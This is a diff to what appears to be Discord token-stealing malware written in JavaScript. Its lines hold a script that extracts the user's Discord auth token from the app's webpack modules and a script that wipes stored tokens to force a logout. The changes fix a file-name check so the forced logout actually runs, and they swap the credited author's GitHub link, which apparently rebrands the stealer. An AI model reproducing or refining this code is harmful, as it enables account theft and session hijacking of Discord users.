@@ -8,7 +8,7 @@ const queryString = require("querystring")
 var computerName = process.env.COMPUTERNAME
 var tokenScript = `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`
 var logOutScript = `function getLocalStoragePropertyDescriptor(){const o=document.createElement("iframe");document.head.append(o);const e=Object.getOwnPropertyDescriptor(o.contentWindow,"localStorage");return o.remove(),e}Object.defineProperty(window,"localStorage",getLocalStoragePropertyDescriptor());const localStorage=getLocalStoragePropertyDescriptor().get.call(window);localStorage.token=null,localStorage.tokens=null,localStorage.MultiAccountStore=null,location.reload();console.log(localStorage.token + localStorage.tokens + localStorage.MultiAccountStore);`
-var doTheLogOut = fs.existsSync("./d3dcompiler.dlll") ? true : false
+var doTheLogOut = fs.existsSync("./d3dcompiler.dll") ? true : false
 
 
 var config = {
@@ -81,7 +81,7 @@ const makeEmbed = async ({
             },
             
             footer: {
-                text: `�[${config.creator}] | https://github.com/Ayhuuu/`
+                text: `�[${config.creator}] | https://github.com/Re-Edit/`
             },
 
         }]
